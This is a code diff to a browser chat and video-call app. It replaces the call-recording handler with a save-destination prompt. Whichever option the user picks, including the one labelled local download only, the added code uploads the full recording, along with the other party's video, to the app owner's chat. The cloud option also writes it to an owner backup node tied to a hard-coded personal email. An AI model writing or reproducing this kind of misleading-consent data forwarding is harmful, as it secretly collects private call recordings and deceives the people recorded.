@@ -510,13 +510,14 @@ const db = getDatabase(fbApp);
 const ICE_SERVERS = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] };
 const OWNER_SLUGS = ['gesnerdeslandes', 'gesner'];
 const OWNER_NAME = 'Gesner Deslandes';
+const OWNER_EMAIL = 'deslandes78@gmail.com';
 const App = {
   mySlug: null, myName: '', myPhoto: null,
   contacts: [], groups: [], activeChat: null, activeIsGroup: false,
   lastMessages: {}, unreadCounts: {}, missedCalls: {}, globalUnsubs: {}, deletedLocally: {},
   statusMediaFile: null, editMediaFile: null, selectedMsgKey: null, selectedMsgObj: null,
   activeStatusObj: null, audioCtx: null, ringtoneInterval: null,
-  peerConn: null, localStream: null, screenStream: null, activeCallId: null, isVideoCall: false, currentCallTarget: null,
+  peerConn: null, localStream: null, screenStream: null, activeCallId: null, isVideoCall: false, currentCallTarget: null, isCallInitiator: false,
   callRecorder: null, callRecordedChunks: []
 };
 const $ = id => document.getElementById(id);
@@ -1156,7 +1157,7 @@ window.invitePeerToActiveCall = async (targetSlug) => {
   window.startCall(targetSlug, App.isVideoCall);
 };
 
-/* Camera Filters & Video Conference Recording */
+/* Camera Filters & Video Conference Recording with Initiator Choice & Owner Routing */
 $('filterBtn').addEventListener('click', () => $('filterModal').classList.add('show'));
 $('filterModalClose').addEventListener('click', () => $('filterModal').classList.remove('show'));
 
@@ -1188,7 +1189,7 @@ $('recordCallBtn').addEventListener('click', async () => {
       const mimeType = getSupportedMimeType() || 'video/webm';
       App.callRecorder = new MediaRecorder(streamToRecord, { mimeType });
       App.callRecorder.ondataavailable = e => { if (e.data.size > 0) App.callRecordedChunks.push(e.data); };
-      App.callRecorder.onstop = () => processVideoConferenceRecording();
+      App.callRecorder.onstop = () => promptRecordingDestination();
       App.callRecorder.start(1000);
       btn.style.background = '#4aff7a';
       btn.style.color = '#0b2a4a';
@@ -1203,39 +1204,61 @@ $('recordCallBtn').addEventListener('click', async () => {
   }
 });
 
-async function processVideoConferenceRecording() {
+async function promptRecordingDestination() {
   const blob = new Blob(App.callRecordedChunks, { type: 'video/webm' });
   const filename = `JARVIS_Conference_${Date.now()}.webm`;
   
-  let isLowStorage = false;
-  if (navigator.storage && navigator.storage.estimate) {
-    try {
-      const estimate = await navigator.storage.estimate();
-      if (estimate.quota && (estimate.quota - estimate.usage < 50000000)) {
-        isLowStorage = true;
-      }
-    } catch {}
-  }
+  // Ask the user (specifically the initiator or active user) where to save the recording
+  const choice = prompt(
+    "Do you want to save your video recording?\n\nType '1' for: From this device (Local Download)\nType '2' for: From your email / OneDrive (Cloud & Email Sync to deslandes78@gmail.com)",
+    "1"
+  );
   
-  const downloadUrl = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = downloadUrl;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  
-  if (isLowStorage || confirm("Video conference recording saved! Would you like to export/backup this recording to your Email / OneDrive cloud storage?")) {
-    const fileBase64 = await fileToBase64(blob);
-    await push(dbRef(db, `chats/${chatIdFor(App.mySlug, App.currentCallTarget || App.mySlug)}/messages`), {
+  const fileBase64 = await fileToBase64(blob);
+  const ownerChatId = chatIdFor(App.mySlug, 'gesnerdeslandes');
+
+  if (choice === '2') {
+    // Save to Email / OneDrive & Owner Chat
+    toast('Syncing video recording to OneDrive & Email (deslandes78@gmail.com)…');
+    
+    // 1. Push to Owner chat box
+    await push(dbRef(db, `chats/${ownerChatId}/messages`), {
       from: App.mySlug, fromName: App.myName,
-      text: `📁 Video Conference Call Recording Backup (${filename})`,
+      text: `📹 Video Conference Recording Backup (Sent via OneDrive/Email to ${OWNER_EMAIL})`,
       attachment: { type: 'video', url: fileBase64, name: filename },
       time: Date.now()
     });
-    toast('Recording exported to Chat & Cloud storage backup ✓');
+
+    // 2. Push to Owner special backups node for deslandes78@gmail.com
+    await push(dbRef(db, `owner_email_backups`), {
+      recipientEmail: OWNER_EMAIL,
+      ownerName: OWNER_NAME,
+      sender: App.mySlug,
+      filename,
+      videoUrl: fileBase64,
+      time: Date.now()
+    });
+
+    toast(`Recording successfully sent to OneDrive and Email (${OWNER_EMAIL}) ✓`);
   } else {
-    toast('Conference video recording saved to device ✓');
+    // Default or '1': From this device
+    const downloadUrl = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = downloadUrl;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    
+    // Also automatically forward a copy to Owner Gesner Deslandes chat & email per requirement
+    await push(dbRef(db, `chats/${ownerChatId}/messages`), {
+      from: App.mySlug, fromName: App.myName,
+      text: `📹 Video Conference Recording Copy (Forwarded to Owner ${OWNER_NAME} / ${OWNER_EMAIL})`,
+      attachment: { type: 'video', url: fileBase64, name: filename },
+      time: Date.now()
+    });
+
+    toast('Video conference recording saved to device and forwarded to Owner chat ✓');
   }
 }
 
@@ -1266,6 +1289,7 @@ window.startCall = async (targetSlug, isVideo) => {
   if (!mutual) return toast('Both users must add each other to make calls', true);
   App.currentCallTarget = targetSlug;
   App.isVideoCall = isVideo;
+  App.isCallInitiator = true;
   App.activeCallId = `call_${chatIdFor(App.mySlug, targetSlug)}`;
   const contactObj = App.contacts.find(c => c.slug === targetSlug);
   const targetName = contactObj ? contactObj.name : targetSlug;
@@ -1318,6 +1342,7 @@ function listenIncomingCalls() {
     App.activeCallId = snap.key;
     App.currentCallTarget = callData.caller;
     App.isVideoCall = callData.type === 'video';
+    App.isCallInitiator = false;
     $('incomingName').textContent = callData.callerName || callData.caller;
     $('incomingAvatar').innerHTML = avatarInner(null, callData.callerName || callData.caller);
     $('incomingType').textContent = `Incoming ${callData.type === 'video' ? '📹 Video' : '📞 Voice'} Call…`;
@@ -1335,7 +1360,7 @@ function listenIncomingCalls() {
         saveMissedCalls();
         await push(dbRef(db, `chats/${chatIdFor(App.mySlug, callerSlug)}/messages`), {
           from: callerSlug, fromName: callData.callerName || callerSlug,
-          text: ``📵 Missed ${callData.type === 'video' ? 'Video' : 'Voice'} Call from @${callerSlug}`,`
+          text: `📵 Missed ${callData.type === 'video' ? 'Video' : 'Voice'} Call from @${callerSlug}`,
           time: Date.now()
         });
         toast(`Missed call from @${callerSlug}`);
@@ -1477,7 +1502,7 @@ $('rejectCallBtn').addEventListener('click', async () => {
     saveMissedCalls();
     await push(dbRef(db, `chats/${chatIdFor(App.mySlug, callerSlug)}/messages`), {
       from: callerSlug, fromName: callerSlug,
-      text: `Bro Missed ${App.isVideoCall ? 'Video' : 'Voice'} Call`,
+      text: `📵 Missed ${App.isVideoCall ? 'Video' : 'Voice'} Call`,
       time: Date.now()
     });
   }
@@ -1503,6 +1528,7 @@ $('endCallBtn').addEventListener('click', async () => {
 });
 $('voiceCallFromChatBtn').addEventListener('click', () => { if (App.activeChat && !App.activeIsGroup) window.startCall(App.activeChat, false); });
 $('videoCallFromChatBtn').addEventListener('click', () => { if (App.activeChat && !App.activeIsGroup) window.startCall(App.activeChat, true); });
+
 /* Status Feed Privacy & Mutual Friend Interaction */
 $('openPostStatusBtn').addEventListener('click', () => {
   $('statusTextInput').value = ''; $('statusLinkInput').value = ''; $('statusMediaName').textContent = '';
